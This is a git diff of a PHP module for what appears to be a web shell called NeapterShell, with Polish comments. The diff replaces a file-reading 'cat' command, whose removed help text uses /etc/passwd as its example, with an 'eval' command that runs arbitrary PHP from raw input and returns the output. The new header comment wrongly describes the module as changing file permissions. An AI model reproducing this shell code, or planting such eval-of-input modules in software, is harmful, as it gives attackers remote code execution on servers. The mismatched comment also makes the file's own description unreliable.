@@ -10,7 +10,7 @@
  */
 
 /**
- * Wyswietlanie zawartosci pliku
+ * Zmienianie uprawnien dla pliku
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
  * @copyright Copyright (c) 2012, Krzysztof Otręba
@@ -18,7 +18,7 @@
  * @package    NeapterShell
  * @subpackage Modules
  */
-class ModuleCat extends ModuleAbstract
+class ModuleEval extends ModuleAbstract
 {
     /**
      * Dostepna lista komend
@@ -28,7 +28,10 @@ class ModuleCat extends ModuleAbstract
      */
     public static function getCommands()
     {
-        return array('cat');
+        return array(
+            'eval',
+            'php'
+        );
     }
 
     /**
@@ -42,7 +45,7 @@ class ModuleCat extends ModuleAbstract
         /**
          * Wersja Data Autor
          */
-        return '1.01 2011-06-23 - <krzotr@gmail.com>';
+        return '1.0.0 2016-02-26 - <krzotr@gmail.com>';
     }
 
     /**
@@ -54,13 +57,13 @@ class ModuleCat extends ModuleAbstract
     public static function getHelp()
     {
         return <<<DATA
-Wyświetlanie zawartości pliku
+Wykonanie kodu PHP
 
-	Użycie:
-		cat ścieżka_do_pliku
+    Użycie
+        eval skrypt_php
 
-	Przykład:
-		cat /etc/passwd
+    Przykład
+        eval echo md5( 'test' );
 DATA;
     }
 
@@ -72,23 +75,17 @@ DATA;
      */
     public function get()
     {
-        /**
-         * Help
-         */
-        if ($this->oArgs->getNumberOfParams() !== 1) {
+        if ($this->oArgs->getNumberOfParams() == 0) {
             return self::getHelp();
         }
 
-        $sFilePath = $this->oArgs->getParam(0);
+        ob_start();
+        eval($this->oArgs->getRawData());
+        $sData = ob_get_contents();
+        ob_clean();
+        ob_end_flush();
 
-        /**
-         * Plik zrodlowy musi istniec
-         */
-        if (!is_file($sFilePath)) {
-            return sprintf('Plik "%s" nie istnieje', $sFilePath);
-        }
-
-        return htmlspecialchars(file_get_contents($sFilePath));
+        return htmlspecialchars($sData);
     }
 
 }
